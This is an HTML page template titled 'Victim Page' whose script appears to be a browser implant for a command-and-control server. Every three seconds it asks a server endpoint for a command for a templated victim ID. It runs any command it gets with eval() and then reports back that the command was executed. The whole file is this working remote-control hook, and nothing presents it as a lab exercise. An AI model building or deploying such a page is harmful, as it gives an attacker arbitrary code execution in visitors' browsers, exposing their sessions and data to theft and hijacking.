<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Victim Page</title>
</head>
<body>
    <h1>Welcome</h1>
    <script>
        const victimId = "{{ victim_id }}";

        async function checkCommands() {
            try {
                let res = await fetch(`/api/get_command?victim=${victimId}`);
                if (res.ok) {
                    let data = await res.json();
                    if (data.command) {
                        console.log("Executing:", data.command);
                        eval(data.command);
                        await fetch(`/api/command_executed?victim=${victimId}`, { method: "POST" });
                    }
                }
            } catch (err) {
                console.error("Error fetching command:", err);
            }
        }

        setInterval(checkCommands, 3000);
    </script>
</body>
</html>
